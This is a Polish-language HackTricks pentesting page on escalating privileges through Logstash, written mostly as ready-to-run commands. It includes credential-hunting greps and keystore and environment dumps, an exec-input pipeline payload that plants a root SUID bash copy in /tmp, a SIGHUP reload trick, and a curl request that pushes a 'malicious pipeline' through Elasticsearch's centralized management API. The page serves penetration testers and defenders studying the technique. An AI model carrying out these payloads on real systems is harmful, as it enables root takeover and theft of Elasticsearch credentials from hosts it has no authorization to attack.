# Eskalacja uprawnień Logstash

{{#include ../../banners/hacktricks-training.md}}

## Logstash

Logstash służy do **gromadzenia, przekształcania i przesyłania logów** za pośrednictwem systemu znanego jako **potoki**. Potoki te składają się z etapów **wejściowych**, **filtrowania** i **wyjściowych**. Interesujący aspekt pojawia się, gdy Logstash działa na zaatakowanej maszynie.

### Konfiguracja potoków

Potoki są konfigurowane w pliku **/etc/logstash/pipelines.yml**, który zawiera lokalizacje konfiguracji potoków:
```yaml
# Define your pipelines here. Multiple pipelines can be defined.
# For details on multiple pipelines, refer to the documentation:
# https://www.elastic.co/guide/en/logstash/current/multiple-pipelines.html

- pipeline.id: main
path.config: "/etc/logstash/conf.d/*.conf"
- pipeline.id: example
path.config: "/usr/share/logstash/pipeline/1*.conf"
pipeline.workers: 6
```
Ten plik ujawnia, gdzie znajdują się pliki **.conf** zawierające konfiguracje pipeline'ów. Przy korzystaniu z **Elasticsearch output module** często zdarza się, że **pipeline'y** zawierają **credentials Elasticsearch**, które zazwyczaj mają szerokie uprawnienia, ponieważ Logstash musi zapisywać dane w Elasticsearch. Wildcards w ścieżkach konfiguracji pozwalają Logstash uruchamiać wszystkie pasujące pipeline'y w wyznaczonym katalogu.

Jeśli Logstash zostanie uruchomiony z `-f <directory>` zamiast `pipelines.yml`, **wszystkie pliki znajdujące się w tym katalogu są łączone w kolejności leksykograficznej i parsowane jako pojedyncza konfiguracja**. Tworzy to 2 ofensywne konsekwencje:

- Dodany plik, taki jak `000-input.conf` lub `zzz-output.conf`, może zmienić sposób składania końcowego pipeline'a
- Nieprawidłowo sformatowany plik może uniemożliwić załadowanie całego pipeline'a, dlatego przed poleganiem na auto-reload należy dokładnie walidować payloady

### Szybka enumeracja na przejętym hoście

Na hoście, na którym zainstalowano Logstash, szybko sprawdź:
```bash
ps aux | grep -i logstash
systemctl cat logstash 2>/dev/null
cat /etc/logstash/pipelines.yml 2>/dev/null
cat /etc/logstash/logstash.yml 2>/dev/null
find /etc/logstash /usr/share/logstash -maxdepth 3 -type f \( -name '*.conf' -o -name 'logstash.yml' -o -name 'pipelines.yml' \) -ls
rg -n --hidden -S 'password|passwd|api[_-]?key|cloud_auth|ssl_keystore_password|truststore_password|user\s*=>|hosts\s*=>' /etc/logstash /usr/share/logstash 2>/dev/null
```
Sprawdź również, czy lokalne API monitorowania jest dostępne. Domyślnie nasłuchuje na **127.0.0.1:9600**, co zwykle wystarcza po uzyskaniu dostępu do hosta:
```bash
curl -s http://127.0.0.1:9600/?pretty
curl -s http://127.0.0.1:9600/_node/pipelines?pretty
curl -s http://127.0.0.1:9600/_node/stats/pipelines?pretty
```
Zwykle otrzymasz identyfikatory pipeline, szczegóły środowiska uruchomieniowego oraz potwierdzenie, że zmodyfikowany pipeline został załadowany.

Poświadczenia odzyskane z Logstash często umożliwiają dostęp do **Elasticsearch**, dlatego sprawdź [tę inną stronę o Elasticsearch](../../network-services-pentesting/9200-pentesting-elasticsearch.md).

### Eskalacja uprawnień za pomocą zapisywalnych pipeline

Aby spróbować eskalacji uprawnień, najpierw ustal użytkownika, z którego uprawnieniami działa usługa Logstash — zazwyczaj jest to użytkownik **logstash**. Musisz spełniać **jedno** z poniższych kryteriów:

- Posiadasz **uprawnienia zapisu** do pliku pipeline **.conf** **lub**
- Plik **/etc/logstash/pipelines.yml** używa wildcardu, a Ty możesz zapisywać w docelowym folderze

Dodatkowo musi być spełniony **jeden** z poniższych warunków:

- Możesz ponownie uruchomić usługę Logstash **lub**
- W pliku **/etc/logstash/logstash.yml** ustawiono **config.reload.automatic: true**

Jeśli konfiguracja zawiera wildcard, utworzenie pliku pasującego do tego wildcardu umożliwia wykonanie poleceń. Na przykład:
```bash
input {
exec {
command => "whoami"
interval => 120
}
}

output {
file {
path => "/tmp/output.log"
codec => rubydebug
}
}
```
Tutaj **interval** określa częstotliwość wykonywania w sekundach. W podanym przykładzie polecenie **whoami** jest uruchamiane co 120 sekund, a jego dane wyjściowe są kierowane do **/tmp/output.log**.

Przy ustawieniu **config.reload.automatic: true** w **/etc/logstash/logstash.yml** Logstash automatycznie wykryje i zastosuje nowe lub zmodyfikowane konfiguracje pipeline bez konieczności ponownego uruchamiania.<sup>[[1]](#references)</sup> Jeśli nie użyto wildcardu, nadal można modyfikować istniejące konfiguracje, ale należy zachować ostrożność, aby uniknąć zakłóceń.

### Bardziej niezawodne payloady pipeline

Plugin wejściowy `exec` nadal działa w obecnych wydaniach i wymaga ustawienia `interval` lub `schedule`. Wykonuje on operację poprzez **forking** JVM Logstash, więc jeśli ilość dostępnej pamięci jest niewystarczająca, payload może zakończyć się błędem `ENOMEM`, zamiast uruchomić się po cichu.

Bardziej praktyczny payload eskalacji uprawnień to zazwyczaj taki, który pozostawia trwały artefakt:
```bash
input {
exec {
command => "cp /bin/bash /tmp/logroot && chown root:root /tmp/logroot && chmod 4755 /tmp/logroot"
interval => 300
}
}
output {
null {}
}
```
Jeśli nie masz uprawnień do restartu, ale możesz wysłać sygnał do procesu, Logstash obsługuje również przeładowanie wywoływane przez **SIGHUP** w systemach uniksopodobnych:<sup>[[1]](#references)</sup>
```bash
kill -SIGHUP $(pgrep -f logstash)
```
Pamiętaj, że nie każdy plugin obsługuje przeładowywanie. Na przykład wejście **stdin** uniemożliwia automatyczne przeładowanie, więc nie zakładaj, że `config.reload.automatic` zawsze wykryje wprowadzone zmiany.<sup>[[1]](#references)</sup>

### Kradzież sekretów z Logstash

Zanim skupisz się wyłącznie na code execution, zbierz dane, do których Logstash ma już dostęp:

- Dane uwierzytelniające w plaintext są często zapisane na stałe wewnątrz wyjść `elasticsearch {}`, `http_poller`, wejść JDBC lub ustawień związanych z cloud
- Bezpieczne ustawienia mogą znajdować się w **`/etc/logstash/logstash.keystore`** lub w innym katalogu `path.settings`
- Hasło keystore jest często przekazywane za pomocą **`LOGSTASH_KEYSTORE_PASS`**, a instalacje oparte na pakietach zazwyczaj pobierają je z **`/etc/sysconfig/logstash`**
- Rozwijanie zmiennych środowiskowych za pomocą `${VAR}` jest wykonywane podczas uruchamiania Logstash, dlatego warto sprawdzić środowisko usługi

Przydatne sprawdzenia:
```bash
ls -l /etc/logstash /etc/logstash/logstash.keystore 2>/dev/null
strings /etc/logstash/conf.d/*.conf 2>/dev/null | head
tr '\0' '\n' < /proc/$(pgrep -o -f logstash)/environ 2>/dev/null | sort
cat /etc/sysconfig/logstash 2>/dev/null
journalctl -u logstash --no-pager 2>/dev/null | tail -n 200
ls -lah /var/log/logstash 2>/dev/null
```
Warto to również sprawdzić, ponieważ **CVE-2023-46672** wykazało, że Logstash w określonych okolicznościach może zapisywać w logach poufne informacje. Na hoście po post-exploitation stare logi Logstash oraz wpisy `journald` mogą zatem ujawniać dane uwierzytelniające, nawet jeśli bieżąca konfiguracja odwołuje się do keystore zamiast przechowywać sekrety bezpośrednio.<sup>[[3]](#references)</sup>

### Abuse of Centralized Pipeline Management

W niektórych środowiskach host w ogóle **nie korzysta z lokalnych plików `.conf`**. Jeśli skonfigurowano **`xpack.management.enabled: true`**, Logstash może pobierać centralnie zarządzane pipeline'y z Elasticsearch/Kibana, a po włączeniu tego trybu lokalne konfiguracje pipeline'ów nie są już źródłem prawdy.<sup>[[2]](#references)</sup>

Oznacza to inną ścieżkę ataku:

1. Odzyskaj dane uwierzytelniające Elastic z lokalnych ustawień Logstash, keystore lub logów
2. Sprawdź, czy konto ma uprawnienie klastra **`manage_logstash_pipelines`**
3. Utwórz lub zastąp centralnie zarządzany pipeline, aby host Logstash wykonał payload podczas następnego interwału odpytywania

API Elasticsearch używane przez tę funkcję to:<sup>[[2]](#references)</sup>
```bash
curl -X PUT http://ELASTIC:9200/_logstash/pipeline/pwned \
-H 'Content-Type: application/json' \
-u user:password \
-d '{
"description": "malicious pipeline",
"pipeline": "input { exec { command => \"id > /tmp/.ls-rce\" interval => 120 } } output { null {} }",
"pipeline_metadata": {"type": "logstash_pipeline", "version": "1"},
"pipeline_settings": {"pipeline.workers": 1, "pipeline.batch.size": 1}
}'
```
Jest to szczególnie przydatne, gdy lokalne pliki są tylko do odczytu, ale Logstash jest już zarejestrowany do zdalnego pobierania pipelines.

## Referencje

- [1] [Elastic Docs: Ponowne ładowanie pliku konfiguracyjnego](https://www.elastic.co/guide/en/logstash/8.19/reloading-config.html)
- [2] [Elastic Docs: Konfigurowanie scentralizowanego zarządzania pipelines](https://www.elastic.co/guide/en/logstash/8.19/configuring-centralized-pipelines.html)
- [3] [Logstash 8.11.1 Security Update (ESA-2023-26) - CVE-2023-46672](https://discuss.elastic.co/t/logstash-8-11-1-security-update-esa-2023-26/347191)

{{#include ../../banners/hacktricks-training.md}}
